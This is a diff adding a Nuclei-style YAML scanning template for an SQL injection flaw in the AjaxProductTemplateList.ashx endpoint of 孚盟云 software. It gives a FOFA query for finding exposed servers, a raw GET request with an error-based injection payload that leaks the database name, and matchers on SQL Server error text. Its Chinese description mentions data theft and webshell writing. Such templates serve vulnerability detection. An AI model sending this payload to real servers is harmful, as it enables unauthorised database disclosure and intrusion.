@@ -1,0 +1,29 @@
+id: fumengyun-ajaxproducttemplatelist-ashx-sql-injection
+
+info:
+  name: "孚盟云 AjaxProductTemplateList.ashx接口SQL注入漏洞"
+  author: NdayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+    该漏洞存在于孚盟云 AjaxProductTemplateList.ashx 接口中。攻击者可通过构造恶意请求利用 SQL 注入漏洞窃取数据库敏感信息（如管理员密码、用户数据）。在特定高权限条件下，攻击者还可尝试写入 Webshell，进而控制服务器系统权限。
+  reference:
+  - https://mp.weixin.qq.com/s/OcI0Mu9VQqVIa8ucaWH_eQ
+  tags: 孚盟云
+
+http:
+- raw:
+  - |
+    GET /m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=SendMail&templateId=1+and+1%3Cdb_name()-- HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '在将 nvarchar 值'
+    - '转换成数据类型 int 时失败'
+    condition: and
+  - type: status
+    status:
+    - 200
